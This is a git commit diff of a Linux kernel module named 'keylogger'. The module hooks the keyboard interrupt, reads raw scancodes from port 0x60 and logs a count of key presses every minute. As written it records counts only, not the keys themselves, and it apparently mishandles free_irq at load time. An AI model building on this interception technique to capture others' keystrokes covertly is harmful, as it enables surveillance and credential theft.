1194459e1ea24d96946f158c4e507d1baff4222f
serbel324 <serbel324@gmail.com>
2021-03-31 21:29:14 +0300

    keylogger finished

--- keylogger_module.c
+++ keylogger_module.c
@@ -1,110 +1,77 @@
 #include <linux/init.h>
-#include <linux/module.h>
+#include <linux/interrupt.h>
 #include <linux/kernel.h>
+#include <linux/module.h>
+#include <linux/sched.h>
+#include <linux/timer.h>
+#include <linux/unistd.h>
+
 #include <linux/fs.h>
-#include <asm/uaccess.h>   
+#include <asm/io.h>   
 
 MODULE_LICENSE("GPL");
 
 /* 	Function prototypes  	*/
 
-int init_module(void);
-void cleanup_module(void);
-static int device_open(struct inode*, struct file*);
-static int device_release(struct inode*, struct file*);
-static ssize_t device_read(struct file*, char*, size_t, loff_t*);
-static ssize_t device_write(struct file*, const char*, size_t, loff_t*);
+static int __init keylogger_init(void);
+static void __exit keylogger_exit(void);
+static irqreturn_t irq_handler(int, void*);
+void timer_callback(struct timer_list* timer);
 
 /*	Defines		*/
 
-#define DEVICE_NAME "keylogger_dev"
-#define BUFFER_LEN 100
+#define INTERRUPT_NAME "keylogger"
+#define LOG_INTERVAL 60000
 
 /*	Global variables	*/
 
-static int major_num;
-static int device_open_count = 0;
-static char msg[BUFFER_LEN];
-static char *msg_ptr;
-
-static struct file_operations file_ops = {
-  .read = device_read,
-  .write = device_write,
-  .open = device_open,
-  .release = device_release
-};
+static volatile unsigned int irq_counter;
+static struct timer_list log_timer;
 
 /*	Functions	*/
 
 static int __init keylogger_init(void)
 {
-	major_num = register_chrdev(0, DEVICE_NAME, &file_ops); 
+	printk(KERN_INFO "Keylogger loaded.\n");
+	free_irq(1, NULL);	
+	irq_counter = 0;
 	
-	if (major_num < 0) 
-	{
-		printk(KERN_ALERT "register_chrdev failed: %d\n", major_num);
-		return major_num;
-	}
-	else 
-	{
-		printk(KERN_INFO "keylogger_device device major number %d\n", major_num);
-		return 0;
-	}
+	timer_setup(&log_timer, timer_callback, 0);
+	mod_timer(&log_timer, jiffies + msecs_to_jiffies(LOG_INTERVAL));
+
+	return request_irq(1, 
+			irq_handler, 
+			IRQF_SHARED, 
+			INTERRUPT_NAME,
+		       	(void*)(irq_handler));
 }
 
 static void __exit keylogger_exit(void)
 {
-	unregister_chrdev(major_num, DEVICE_NAME);
-	printk(KERN_INFO "Keylogger exited\n");
+	free_irq(1, NULL);
+	del_timer(&log_timer);
+
+	printk(KERN_INFO "Keylogger unloaded\n");
 }
 
 module_init(keylogger_init);
 module_exit(keylogger_exit);
 
-static ssize_t device_read(struct file* flip, 
-		char* msg_buffer, 
-		size_t len, 
-		loff_t* offset) 
+static irqreturn_t irq_handler(int irq, void* dev)
 {
-	int bytes_read = 0;
+	static unsigned char scancode;
 	
-	if (*msg_ptr == 0) 
-	{
-		msg_ptr = msg_buffer;
-	}	
-	while (len && *msg_ptr) 
-	{
-		put_user(*(msg_ptr++), msg_buffer++);
-		len--;
-		bytes_read++;
-	}
-
-	return bytes_read;
+	scancode = inb(0x60);
+	
+	if (scancode & 0x80)
+		irq_counter++;
+	
+	return IRQ_HANDLED;
 }
 
-static ssize_t device_write(struct file* flip, 
-		const char* msg_buffer, 
-		size_t len, 
-		loff_t* offset) 
+void timer_callback(struct timer_list* timer)
 {
-	printk(KERN_ALERT "Can't write to keyboard device.\n");
-	return -EINVAL;
-}
-
-static int device_open(struct inode* inode, struct file* file)
-{
-	if (device_open_count)
-	{
-		return -EBUSY;
-	}
-	device_open_count++;
-	try_module_get(THIS_MODULE);
-	return 0;
-}
-
-static int device_release(struct inode* inode, struct file* file)
-{
-	device_open_count--;
-	module_put(THIS_MODULE);
-	return 0;
+	printk(KERN_INFO "keys pressed %d times", irq_counter);
+	irq_counter = 0;
+	mod_timer(&log_timer, jiffies + msecs_to_jiffies(LOG_INTERVAL));
 }
